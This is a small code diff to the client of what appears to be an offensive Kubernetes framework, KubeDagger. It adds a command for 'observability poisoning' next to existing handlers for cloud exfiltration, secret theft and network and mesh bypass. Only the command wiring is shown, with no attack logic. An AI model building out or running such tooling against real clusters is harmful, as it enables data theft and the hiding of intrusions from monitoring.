@@ -31,6 +31,7 @@ import (
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/k8s_abuse"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/meshbypass"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/netbypass"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/obs_poison"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/secrets"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dashboard"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/dns_exfil"
@@ -256,6 +257,11 @@ func meshBypassCmd(cmd *cobra.Command, args []string) error {
 func cloudExfilCmd(cmd *cobra.Command, args []string) error {
 	logrus.SetLevel(options.LogLevel)
 	return cloud_exfil.Execute(options.Target, options.ExfilProvider, options.ExfilBucket, options.ExfilPath, options.ExfilCredsFrom, options.Output)
+}
+
+func obsPoisonCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return obs_poison.Execute(options.Target, options.PoisonTarget, options.PoisonEndpoint, options.PoisonStrategy, options.Output)
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
